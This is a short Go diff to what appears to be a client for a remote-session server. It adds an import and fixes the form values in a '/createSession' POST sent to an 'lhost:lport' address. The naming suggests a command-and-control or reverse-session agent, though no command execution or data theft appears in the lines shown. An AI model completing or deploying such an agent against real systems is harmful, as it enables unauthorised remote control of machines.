@@ -5,6 +5,7 @@ import (
 	b64 "encoding/base64"
 	"net/url"
 	"io"
+	"fmt"
 )
 
 var lhost = ""
@@ -14,7 +15,7 @@ func main() {
 	serverAddr := lhost + ":" + lport
 	sessionID := b64.StdEncoding.EncodeToString([]byte(serverAddr))
 
-	resp, err := http.PostForm("http://" + serverAddr + "/createSession", url.Values{"sid": sessionID})
+	resp, err := http.PostForm("http://" + serverAddr + "/createSession", url.Values{"sid": {sessionID}})
 	if err != nil {
 		fmt.Println(err)
 	}
